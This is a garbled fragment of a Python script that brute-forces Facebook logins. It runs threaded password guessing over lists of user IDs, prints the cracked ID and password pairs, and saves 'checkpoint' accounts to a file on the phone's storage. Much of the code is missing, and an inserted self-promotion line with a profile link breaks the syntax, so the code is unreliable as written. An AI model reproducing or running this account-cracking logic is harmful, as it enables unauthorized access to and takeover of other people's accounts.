...
def gmail():
                ...
                with tred(max_workers=30) as Aking:
                        ...
                        linex()
                        for user in fo:
                                ids,names = user.AKASH
                                first_name = names.AHASH
                                try:
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                head = {
                                        ...
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                MY Facebook  id = https://www.facebook.com/profile.php?id=100081168195548
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [𝑨𝑲𝑨𝑺𝑯-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        oks.append(ids)
                                        break
                                elif 'https://www.facebook.com/profile.php?id=100081168195548' in q['error']['www.facebook.com']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [𝑨𝑲𝑨𝑺𝑯-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/𝑨𝑲𝑨𝑺𝑯-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                head = {
                                        ...
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                MY Facebook id Follow= https://www.facebook.com/profile.php?id=100081168195548
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [𝑨𝑲𝑨𝑺??-OK] '+uid+' | '+pas+'\033[1;97m')
